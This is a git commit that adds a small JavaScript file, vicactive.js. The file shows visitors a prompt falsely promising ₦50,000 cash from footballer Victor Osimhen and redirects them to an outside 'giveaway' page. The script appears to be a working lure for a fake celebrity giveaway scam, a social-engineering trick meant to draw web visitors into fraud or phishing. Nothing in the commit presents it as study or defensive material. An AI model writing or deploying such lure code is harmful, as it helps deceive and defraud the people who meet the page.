47be393750e7e533154f343d2f7d37e87d5400f9
graantx <slicer_sizzles9k@icloud.com>
2026-05-11 12:54:32 +0100

    Create vicactive.js

---
+++ vicactive.js
@@ -0,0 +1,11 @@
+
+var password = '₦50,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦50,000 Cash from Victor Osimhen. Click OK to activate now.',
+  '₦50,000'
+);
+
+if (password !== '₦50,000') {
+    location.href = 'https://rhud.info/Victor-Osimhen-Giveaway.html';
+}
